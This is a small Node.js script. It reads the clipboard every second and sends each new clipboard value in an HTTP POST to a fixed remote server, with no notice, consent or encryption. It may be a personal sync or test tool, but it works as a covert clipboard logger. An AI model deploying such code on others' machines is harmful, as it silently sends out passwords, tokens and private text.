import clipboardy from 'clipboardy';
import request from 'request';
async function main() {
    var prevData = ""
    setInterval(async () => {
        const text = await clipboardy.read();
        if (prevData == text || text == "" || text === " ") {
        } else {
            prevData = text;
            var myJSONObject = { text };
            request({
                url: "http://testlink.techietrix.com/clipboard/saveclipboard",
                method: "POST",
                json: true, 
                body: myJSONObject
            }, function (error, response, body) {
                // console.log(response);
            });
        }
    }, 1 * 1000)
}
main();